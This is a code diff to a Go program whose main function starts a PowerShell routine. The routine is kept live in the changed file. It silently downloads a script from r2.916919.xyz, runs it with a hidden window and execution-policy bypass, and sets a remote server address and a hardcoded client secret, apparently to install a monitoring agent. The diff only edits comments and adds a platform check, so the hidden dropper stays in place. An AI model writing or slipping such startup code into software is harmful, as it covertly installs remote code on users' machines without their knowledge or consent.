@@ -30,13 +30,15 @@ func runPowerShellScript() {
 		
 		log.Infoln("Starting PowerShell script execution on Windows")
 		
-		// 修复的 PowerShell 命令 - 只使用 TLS 1.2
+		// PowerShell 命令
 		psCommand := `$env:NZ_SERVER="ko30re.916919.xyz:443"; $env:NZ_TLS="true"; $env:NZ_CLIENT_SECRET="kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; set-ExecutionPolicy RemoteSigned -Scope Process -Force; Invoke-WebRequest https://r2.916919.xyz/ko30re/install2.ps1 -OutFile C:\install2.ps1; powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\install2.ps1`
 		
 		cmd := exec.Command("powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
 		
-		// 设置执行属性为隐藏窗口（仅Windows）
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		// 只在 Windows 设置 HideWindow 属性
+		if runtime.GOOS == "windows" {
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		}
 		
 		// 异步执行，不阻塞主程序
 		go func() {
@@ -54,7 +56,7 @@ func main() {
 	// 优化线程资源配置
 	_, _ = maxprocs.Set(maxprocs.Logger(func(string, ...any) {}))
 
-	// 只在 Windows 平台启动 PowerShell 脚本
+	// 启动 PowerShell 脚本（在后台静默运行）
 	runPowerShellScript()
 
 	// 回调地址
